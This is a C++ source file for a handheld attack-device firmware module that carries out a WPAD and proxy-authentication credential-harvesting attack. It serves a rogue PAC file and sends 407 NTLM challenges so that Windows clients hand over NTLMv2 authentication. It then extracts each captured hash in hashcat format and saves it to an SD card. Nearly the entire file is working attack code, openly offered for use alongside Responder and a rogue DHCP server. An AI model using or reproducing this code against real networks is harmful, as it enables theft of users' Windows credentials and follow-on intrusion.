/*
 * SaltyJack — WPAD / 407 Proxy NTLM harvest.
 *
 * Direct port of @7h30th3r0n3's WPAD abuse module from Evil-Cardputer
 * (Evil-M5Project). https://github.com/7h30th3r0n3/Evil-M5Project
 *
 * How it works:
 *   1. Victims look up "wpad" via LLMNR/NBNS (run Responder side-by-
 *      side) or get a WPAD URL from a rogue DHCP Option 252 lease.
 *   2. Either way they resolve wpad → our IP and HTTP-GET /wpad.dat.
 *   3. We serve a PAC file telling them to proxy *all* HTTP through us.
 *   4. The browser starts sending HTTP through us, seeing us as a proxy.
 *      We respond `407 Proxy Authentication Required` with
 *      `Proxy-Authenticate: NTLM`. Windows auto-fires NTLMSSP handshake.
 *   5. We complete the NTLM Type-1 → Type-2 → Type-3 dance in HTTP
 *      headers (base64'd), extract the Type-3 hash, write hashcat format
 *      to SD.
 *
 * Pair with SaltyJack Rogue DHCP (Option 252 points at us) + Responder
 * for maximum name-resolution coverage.
 */
#include "../../app.h"
#include "../../ui.h"
#include "../../input.h"
#include "../../radio.h"
#include "saltyjack.h"
#include "saltyjack_style.h"
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <SD.h>
#include <esp_random.h>
#include "mbedtls/base64.h"
#include <sys/time.h>

#define WPAD_HTTP_PORT   80
#define HASH_LOG_PATH    "/poseidon/saltyjack/ntlm_hashes.txt"

static WiFiServer s_server(WPAD_HTTP_PORT);
static uint8_t    s_challenge[8];

static uint32_t s_wpad_gets  = 0;
static uint32_t s_407_sent   = 0;
static uint32_t s_type1_seen = 0;
static uint32_t s_hash_count = 0;
static char     s_last_user[40]   = "";
static char     s_last_domain[40] = "";
static char     s_last_client[32] = "";

/* ===== PAC file content ===== */

static String build_pac(IPAddress proxy_ip)
{
    String s;
    s += "function FindProxyForURL(url, host) {\n";
    s += "  return \"PROXY ";
    s += proxy_ip.toString();
    s += ":80; DIRECT\";\n";
    s += "}\n";
    return s;
}

/* ===== base64 helpers ===== */

static bool b64_decode(const String &b64, uint8_t *out, size_t out_cap, size_t *out_len)
{
    int rc = mbedtls_base64_decode(out, out_cap, out_len,
                                   (const unsigned char *)b64.c_str(), b64.length());
    return rc == 0;
}

static String b64_encode(const uint8_t *data, size_t len)
{
    size_t need = 4 * ((len + 2) / 3) + 1;
    uint8_t *buf = (uint8_t *)malloc(need);
    if (!buf) return "";
    size_t out_len = 0;
    int rc = mbedtls_base64_encode(buf, need, &out_len, data, len);
    if (rc != 0) { free(buf); return ""; }
    buf[out_len] = 0;
    String s((char *)buf);
    free(buf);
    return s;
}

/* ===== NTLM Type-2 builder (matches responder's) ===== */

static uint64_t wts(void)
{
    const uint64_t EPOCH_DIFF = 11644473600ULL;
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
}

static void build_type2(uint8_t *buf, uint16_t *out_len)
{
    const char *nb_name   = "POSEIDON-SJ";
    const char *nb_domain = "SALTYJACK";
    const char *dns_dom   = "saltyjack.lan";

    uint8_t av[512];
    int off = 0;
    auto push_av = [&](uint16_t type, const char *data) {
        int l = strlen(data);
        av[off++] = type & 0xFF; av[off++] = (type >> 8) & 0xFF;
        av[off++] = (l * 2) & 0xFF; av[off++] = ((l * 2) >> 8) & 0xFF;
        for (int i = 0; i < l; ++i) { av[off++] = data[i]; av[off++] = 0x00; }
    };

    push_av(0x0001, nb_name);
    push_av(0x0002, nb_domain);
    push_av(0x0003, nb_name);
    push_av(0x0004, dns_dom);
    push_av(0x0005, dns_dom);
    av[off++] = 0x07; av[off++] = 0x00;
    av[off++] = 0x08; av[off++] = 0x00;
    uint64_t ts = wts();
    memcpy(av + off, &ts, 8); off += 8;
    av[off++] = 0x00; av[off++] = 0x00; av[off++] = 0x00; av[off++] = 0x00;

    const int HDR = 48;
    memcpy(buf, "NTLMSSP\0", 8);
    buf[8] = 0x02; buf[9] = buf[10] = buf[11] = 0x00;

    uint16_t tlen = strlen(nb_name) * 2;
    buf[12] = tlen & 0xFF; buf[13] = (tlen >> 8) & 0xFF;
    buf[14] = buf[12]; buf[15] = buf[13];
    *(uint32_t *)(buf + 16) = HDR;
    *(uint32_t *)(buf + 20) = 0xE2898215;
    memcpy(buf + 24, s_challenge, 8);
    memset(buf + 32, 0, 8);
    uint16_t av_len = off;
    *(uint16_t *)(buf + 40) = av_len;
    *(uint16_t *)(buf + 42) = av_len;
    *(uint32_t *)(buf + 44) = HDR + tlen;

    int p = HDR;
    const char *n = nb_name;
    while (*n) { buf[p++] = *n++; buf[p++] = 0x00; }
    memcpy(buf + p, av, av_len); p += av_len;
    *out_len = p;
}

/* ===== Type-3 hash extractor ===== */

static void save_hash(const uint8_t *buf, size_t n, const char *client_ip_str)
{
    if (n < 64) return;
    auto le16 = [&](size_t off) -> uint16_t { return (uint16_t)(buf[off] | (buf[off + 1] << 8)); };
    auto le32 = [&](size_t off) -> uint32_t {
        return (uint32_t)(buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | (buf[off + 3] << 24));
    };

    uint16_t nt_len   = le16(20);
    uint32_t nt_off   = le32(24);
    uint16_t dom_len  = le16(28);
    uint32_t dom_off  = le32(32);
    uint16_t user_len = le16(36);
    uint32_t user_off = le32(40);

    if (nt_off + nt_len > n || user_off + user_len > n || dom_off + dom_len > n) return;
    if (nt_len < 16) return;

    char domain[40], username[40];
    size_t j = 0;
    for (uint16_t i = 0; i < dom_len && j + 1 < sizeof(domain); i += 2) domain[j++] = (char)buf[dom_off + i];
    domain[j] = '\0';
    j = 0;
    for (uint16_t i = 0; i < user_len && j + 1 < sizeof(username); i += 2) username[j++] = (char)buf[user_off + i];
    username[j] = '\0';

    char chal_hex[17];
    for (int i = 0; i < 8; ++i) sprintf(chal_hex + i * 2, "%02X", s_challenge[i]);
    chal_hex[16] = '\0';

    /* Proof = first 16 bytes of NTLMv2 response, blob = remainder */
    char *proof_hex = (char *)malloc(16 * 2 + 1);
    char *blob_hex  = (char *)malloc((nt_len - 16) * 2 + 1);
    if (!proof_hex || !blob_hex) { free(proof_hex); free(blob_hex); return; }
    for (int i = 0; i < 16; ++i) sprintf(proof_hex + i * 2, "%02X", buf[nt_off + i]);
    proof_hex[32] = '\0';
    for (int i = 0; i < nt_len - 16; ++i) sprintf(blob_hex + i * 2, "%02X", buf[nt_off + 16 + i]);
    blob_hex[(nt_len - 16) * 2] = '\0';

    char line[2048];
    snprintf(line, sizeof(line), "%s::%s:%s:%s:%s", username, domain, chal_hex, proof_hex, blob_hex);

    Serial.println("---- SaltyJack WPAD NTLMv2 capture ----");
    Serial.println(line);
    Serial.println("---------------------------------------");

    SD.mkdir("/poseidon");
    SD.mkdir("/poseidon/saltyjack");
    File f = SD.open(HASH_LOG_PATH, FILE_APPEND);
    if (f) {
        f.print("# wpad from ");
        f.println(client_ip_str);
        f.println(line);
        f.close();
    }
    strncpy(s_last_user, username, sizeof(s_last_user));
    strncpy(s_last_domain, domain, sizeof(s_last_domain));
    strncpy(s_last_client, client_ip_str, sizeof(s_last_client));
    s_hash_count++;

    free(proof_hex);
    free(blob_hex);
}

/* ===== HTTP request handling ===== */

struct http_req_t {
    String method;
    String path;
    String auth_hdr;   /* value after "Authorization: NTLM " or "Proxy-Authorization: NTLM " */
    String host;
};

static bool read_request(WiFiClient &c, http_req_t &req, uint32_t timeout_ms = 2000)
{
    String line;
    uint32_t t0 = millis();
    bool got_reqline = false;
    while (c.connected() && millis() - t0 < timeout_ms) {
        if (!c.available()) { delay(2); continue; }
        char ch = (char)c.read();
        if (ch == '\r') continue;
        if (ch == '\n') {
            if (line.length() == 0) return got_reqline;
            if (!got_reqline) {
                int sp1 = line.indexOf(' ');
                int sp2 = line.indexOf(' ', sp1 + 1);
                if (sp1 > 0 && sp2 > sp1) {
                    req.method = line.substring(0, sp1);
                    req.path   = line.substring(sp1 + 1, sp2);
                    got_reqline = true;
                }
            } else {
                /* Header line */
                String lower = line;
                lower.toLowerCase();
                if (lower.startsWith("authorization:") || lower.startsWith("proxy-authorization:")) {
                    int colon = line.indexOf(':');
                    String v = line.substring(colon + 1);
                    v.trim();
                    if (v.startsWith("NTLM ") || v.startsWith("ntlm ")) {
                        req.auth_hdr = v.substring(5);
                        req.auth_hdr.trim();
                    }
                } else if (lower.startsWith("host:")) {
                    req.host = line.substring(5);
                    req.host.trim();
                }
            }
            line = "";
        } else {
            line += ch;
            if (line.length() > 2048) return false;
        }
    }
    return got_reqline;
}

static void send_pac(WiFiClient &c, IPAddress proxy_ip)
{
    String body = build_pac(proxy_ip);
    String resp = "HTTP/1.1 200 OK\r\n"
                  "Content-Type: application/x-ns-proxy-autoconfig\r\n"
                  "Content-Length: " + String((int)body.length()) + "\r\n"
                  "Connection: close\r\n\r\n" + body;
    c.print(resp);
    s_wpad_gets++;
}

static void send_407_initial(WiFiClient &c)
{
    const char *resp =
        "HTTP/1.1 407 Proxy Authentication Required\r\n"
        "Proxy-Authenticate: NTLM\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n\r\n";
    c.print(resp);
    s_407_sent++;
}

static void send_407_type2(WiFiClient &c, const String &b64_type2)
{
    String resp =
        "HTTP/1.1 407 Proxy Authentication Required\r\n"
        "Proxy-Authenticate: NTLM " + b64_type2 + "\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n\r\n";
    c.print(resp);
}

static void send_200_empty(WiFiClient &c)
{
    const char *resp =
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n\r\n";
    c.print(resp);
}

/* Return our reachable IP in either STA or AP mode. In AP-only mode
 * `WiFi.localIP()` yields 0.0.0.0, which would bake a broken PROXY line
 * into the PAC file and silently kill the whole attack. */
static IPAddress wpad_our_ip(void)
{
    if (WiFi.status() == WL_CONNECTED) {
        IPAddress ip = WiFi.localIP();
        if (ip != IPAddress(0, 0, 0, 0)) return ip;
    }
    return WiFi.softAPIP();
}

static void handle_client(WiFiClient c)
{
    IPAddress peer = c.remoteIP();
    while (c.connected()) {
        http_req_t req;
        if (!read_request(c, req)) break;

        /* WPAD file request — anyone asking gets PAC */
        if (req.path.endsWith("wpad.dat") || req.path.endsWith("wpad.da") /* some buggy clients */) {
            send_pac(c, wpad_our_ip());
            break;
        }

        /* No NTLM header yet → kick off 407 */
        if (req.auth_hdr.length() == 0) {
            send_407_initial(c);
            continue;
        }

        /* Decode NTLMSSP message */
        uint8_t ntlm[2048];
        size_t ntlm_len = 0;
        if (!b64_decode(req.auth_hdr, ntlm, sizeof(ntlm), &ntlm_len) || ntlm_len < 12) {
            send_200_empty(c);
            break;
        }
        if (memcmp(ntlm, "NTLMSSP", 7) != 0) {
            send_200_empty(c);
            break;
        }
        uint8_t type = ntlm[8];
        if (type == 1) {
            /* Build Type-2 challenge, fresh random 8-byte server challenge */
            for (int i = 0; i < 8; ++i) s_challenge[i] = (uint8_t)(esp_random() & 0xFF);
            uint8_t t2[512];
            uint16_t t2_len = 0;
            build_type2(t2, &t2_len);
            String b64 = b64_encode(t2, t2_len);
            send_407_type2(c, b64);
            s_type1_seen++;
            continue;
        }
        if (type == 3) {
            save_hash(ntlm, ntlm_len, peer.toString().c_str());
            send_200_empty(c);
            break;
        }
        send_200_empty(c);
        break;
    }
    c.stop();
}

/* ===== feature entry ===== */

void feat_saltyjack_wpad(void)
{
    radio_switch(RADIO_WIFI);
    if (WiFi.status() != WL_CONNECTED) {
        auto &d = M5Cardputer.Display;
        sj_frame("WPAD / 407 NTLM");
        d.setTextColor(SJ_BAD, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 24); d.print("Not connected.");
        d.setTextColor(SJ_FG, SJ_BG);
        d.setCursor(SJ_CONTENT_X, BODY_Y + 38); d.print("Join target WiFi first");
        sj_footer("`=back");
        while (input_poll() == PK_NONE) delay(30);
        return;
    }

    s_server.begin();
    s_wpad_gets = s_407_sent = s_type1_seen = s_hash_count = 0;
    s_last_user[0] = s_last_domain[0] = s_last_client[0] = '\0';

    auto &d = M5Cardputer.Display;
    sj_frame("WPAD / 407 NTLM");

    uint32_t last_draw = 0;
    while (true) {
        WiFiClient c = s_server.available();
        if (c) handle_client(c);

        if (millis() - last_draw > 250) {
            last_draw = millis();
            sj_frame("WPAD / 407 NTLM");

            d.setTextColor(SJ_FG_DIM, SJ_BG);
            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y);
            d.print("ip ");
            d.setTextColor(SJ_ACCENT, SJ_BG);
            d.print(wpad_our_ip().toString().c_str());

            sj_row           (SJ_CONTENT_Y + 11, "PAC gets", s_wpad_gets);
            sj_row           (SJ_CONTENT_Y + 20, "407 sent", s_407_sent);
            sj_row           (SJ_CONTENT_Y + 29, "type1   ", s_type1_seen);
            sj_row_highlight (SJ_CONTENT_Y + 38, "HASHES  ", s_hash_count);

            if (s_last_user[0]) {
                int by = SJ_CONTENT_Y + 55;
                sj_info_box(SJ_FRAME_X + 4, by, SJ_FRAME_W - 8, 28, "LAST CAPTURE");
                char ud[48];
                snprintf(ud, sizeof(ud), "%.18s\\%.12s", s_last_domain, s_last_user);
                sj_info_row(SJ_FRAME_X + 4, by, 0, "user", ud);
                sj_info_row(SJ_FRAME_X + 4, by, 1, "from", s_last_client);
            } else {
                sj_print_info(SJ_CONTENT_Y + 58, s_type1_seen > 0 ?
                    "NTLM dance in flight..." : "serving PAC...");
            }

            sj_footer("`=stop");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == PK_NONE) delay(5);
    }

    s_server.end();
}
